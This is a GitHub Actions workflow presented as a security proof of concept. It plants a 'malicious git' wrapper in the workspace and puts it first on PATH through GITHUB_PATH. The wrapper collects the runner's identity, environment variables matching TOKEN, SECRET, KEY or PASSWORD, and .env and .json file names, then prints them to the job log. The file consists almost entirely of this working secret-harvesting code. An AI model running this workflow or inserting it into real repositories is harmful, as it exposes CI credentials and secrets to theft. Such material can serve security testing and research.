name: PoC Security Test
on: [push]
jobs:
  build:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v3
      
      - name: Create malicious git
        run: |
          mkdir -p bin
          cat << 'EOF' > bin/git
          #!/bin/bash
          OUTPUT="/tmp/proof.txt"
          echo "--- ADVANCED RCE PROOF ---" > $OUTPUT
          echo "USER INFO:" >> $OUTPUT
          id >> $OUTPUT 2>&1
          echo -e "\n--- SECRET TOKENS ---" >> $OUTPUT
          printenv | grep -E 'TOKEN|SECRET|KEY|PASSWORD' >> $OUTPUT 2>&1
          echo -e "\n--- SENSITIVE FILES ---" >> $OUTPUT
          find . -maxdepth 2 -name "*.env" -o -name "*.json" >> $OUTPUT 2>&1
          /usr/bin/git "$@"
          EOF
          chmod +x bin/git
          
      - name: Inject PATH
        run: echo "$GITHUB_WORKSPACE/bin" >> $GITHUB_PATH
        
      - name: Run test
        run: |
          git --version
          echo "--- RESULT ---"
          cat /tmp/proof.txt
